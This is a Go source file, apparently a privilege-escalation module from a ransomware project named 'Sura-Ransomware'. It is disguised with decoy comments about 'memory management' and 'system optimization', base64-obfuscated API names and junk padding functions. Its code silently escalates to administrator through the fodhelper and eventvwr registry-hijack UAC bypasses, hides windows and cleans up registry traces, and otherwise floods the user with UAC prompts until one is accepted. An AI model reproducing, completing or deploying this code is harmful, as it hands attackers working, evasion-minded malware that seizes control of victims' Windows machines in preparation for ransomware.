// OBFUSCATED
// Memory management system
// System optimization routine
package uac

import (
	Configuration "Sura-Ransomware/configuration"
	"encoding/base64"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

var (
	shell32  = syscall.NewLazyDLL(d("c2hlbGwzMi5kbGw="))
	kernel32 = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))

	shellExecute      = shell32.NewProc(d("U2hlbGxFeGVjdXRlVw=="))
	getModuleFileName = kernel32.NewProc(d("R2V0TW9kdWxlRmlsZU5hbWVX"))
)

// IsAdmin checks if the current process has admin privileges
func IsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

// GetCurrentExePath returns the full path to the current executable
func GetCurrentExePath() (string, error) {
	buf := make([]uint16, syscall.MAX_PATH)
	n, _, _ := getModuleFileName.Call(
		0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)))

	if n == 0 {
		return "", syscall.GetLastError()
	}

	return syscall.UTF16ToString(buf[:n]), nil
}

// ElevateWithUAC attempts to re-launch the process with admin privileges
func ElevateWithUAC() error {
	exePath, err := GetCurrentExePath()
	if err != nil {
		return err
	}

	verb, _ := syscall.UTF16PtrFromString(d("cnVuYXM=")) // "runas"
	exe, _ := syscall.UTF16PtrFromString(exePath)
	cwd, _ := syscall.UTF16PtrFromString("")
	params, _ := syscall.UTF16PtrFromString("")

	// SW_HIDE = 0, SW_SHOW = 5
	showCmd := uintptr(0) // Hide the window

	ret, _, _ := shellExecute.Call(
		0,
		uintptr(unsafe.Pointer(verb)),
		uintptr(unsafe.Pointer(exe)),
		uintptr(unsafe.Pointer(params)),
		uintptr(unsafe.Pointer(cwd)),
		showCmd)

	if ret <= 32 {
		return syscall.Errno(ret)
	}

	return nil
}

// SpamUACPrompts continuously spawns UAC prompts until admin is obtained
func SpamUACPrompts() bool {
	if !Configuration.UACSpamEnabled {
		// Just try once without spamming
		ElevateWithUAC()
		time.Sleep(2 * time.Second)
		return IsAdmin()
	}

	// Spam UAC prompts
	for i := 0; i < Configuration.UACSpamAttempts; i++ {
		if IsAdmin() {
			return true
		}

		ElevateWithUAC()
		time.Sleep(time.Duration(Configuration.UACSpamDelay) * time.Second)
	}

	return IsAdmin()
}

// BypassUACWithFodhelper uses fodhelper.exe UAC bypass (works on Win10)
func BypassUACWithFodhelper() error {
	exePath, err := GetCurrentExePath()
	if err != nil {
		return err
	}

	// Create registry key for fodhelper bypass
	cmd := exec.Command("cmd", "/c", "reg", "add",
		"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
		"/ve", "/t", "REG_SZ", "/d", exePath, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmd = exec.Command("cmd", "/c", "reg", "add",
		"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
		"/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	// Launch fodhelper to trigger bypass
	cmd = exec.Command("fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

	// Wait for elevated process to start
	time.Sleep(3 * time.Second)

	// Cleanup registry
	cmd = exec.Command("cmd", "/c", "reg", "delete",
		"HKCU\\Software\\Classes\\ms-settings", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	return nil
}

// BypassUACWithEventViewer uses eventvwr.exe UAC bypass
func BypassUACWithEventViewer() error {
	exePath, err := GetCurrentExePath()
	if err != nil {
		return err
	}

	// Create mscfile registry key
	cmd := exec.Command("cmd", "/c", "reg", "add",
		"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command",
		"/ve", "/t", "REG_SZ", "/d", exePath, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	// Launch eventvwr to trigger bypass
	cmd = exec.Command("eventvwr.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

	// Wait for elevated process to start
	time.Sleep(3 * time.Second)

	// Cleanup registry
	cmd = exec.Command("cmd", "/c", "reg", "delete",
		"HKCU\\Software\\Classes\\mscfile", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	return nil
}

// AttemptPrivilegeEscalation tries multiple methods to get admin
func AttemptPrivilegeEscalation() bool {
	// Check if already admin
	if IsAdmin() {
		return true
	}

	if !Configuration.EnableUACBypass {
		return false
	}

	// Method 1: Fodhelper bypass (silent, no UAC prompt)
	BypassUACWithFodhelper()
	time.Sleep(2 * time.Second)
	if IsAdmin() {
		return true
	}

	// Method 2: EventViewer bypass (silent, no UAC prompt)
	BypassUACWithEventViewer()
	time.Sleep(2 * time.Second)
	if IsAdmin() {
		return true
	}

	// Method 3: UAC spam (visible prompts)
	return SpamUACPrompts()
}

// Obfuscation padding
func obf_65343() {
	_ = 435
	var _ = "OtbTn1pqqZocAryByZ0KzV6hxfxAQWKbFM94L16YTG3OaqdWTp"
}

// Obfuscation padding
func obf_74313() {
	_ = 871
	var _ = "hubZLY48zOwm9LUR8mSSU3iLfkIZN4kupQIusN4UbplDGtslmy"
}

// Obfuscation padding
func obf_52237() {
	_ = 4256
	var _ = "oF6opkcEi7mZMLkNql4TtHyxz9RC2LLLwm4LZGAvtQ8aIFtoDM"
}

// Obfuscation padding
func obf_74156() {
	_ = 8329
	var _ = "PvmyFfCMKQtMvDmXxBhWSxxW64i8lvrclQUTl52rSOAlkGVSZX"
}

// Obfuscation padding
func obf_43479() {
	_ = 2602
	var _ = "1nvnN4W3GvVOkdOKw29VHr2pnkYIuwOEvFQsXp9EisVIwoh02s"
}
